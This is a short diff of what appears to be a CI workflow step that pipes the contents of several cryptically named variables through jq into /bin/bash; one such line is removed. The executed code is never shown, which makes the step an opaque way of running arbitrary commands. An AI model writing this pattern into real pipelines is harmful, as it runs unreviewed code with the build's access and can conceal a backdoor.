@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$zi9" | jq -r .pbuuu5 | /bin/bash
           echo $uga92 | jq -r .cvcp18248 | /bin/bash
-          echo $v1 | jq -r .yxps0 | /bin/bash
           echo $izq7504 | jq -r .fpk3 | /bin/bash
 
       - name: Archive results
